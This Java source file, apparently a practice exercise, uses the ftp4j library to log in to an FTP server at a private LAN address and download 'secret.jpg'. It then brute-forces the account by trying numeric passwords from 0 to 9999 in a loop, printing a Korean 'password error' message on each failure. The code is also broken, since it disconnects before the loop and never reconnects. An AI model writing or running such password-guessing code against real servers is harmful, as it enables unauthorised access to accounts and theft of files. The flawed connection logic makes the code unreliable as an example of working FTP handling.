import java.io.File;
import java.lang.invoke.StringConcatFactory;

import it.sauronsoftware.ftp4j.FTPClient;

public class Main {

	public static void main(String[] args) throws Exception{
		FTPClient client = new FTPClient();
		client.connect("192.168.150.11", 21);
		client.login("java", "java");
		//File file = new File("d:/downloadfol/다운성공.txt");
		client.download("secret.jpg", new File("d:/downloadfol/test3.jpg"));
	
		client.disconnect(true);
		
		
		for(int i=0; i<10000; i++ ) {
		try {
			client.login("java", String.valueOf(i));
			client.download("secret.jpg", new File("d:/downloadfol/test3.jpg"));
			break;
		}catch (Exception e) {
			System.out.println("패스워드 오류");
		}
		
	}
		client.disconnect(true);
		}
	
}
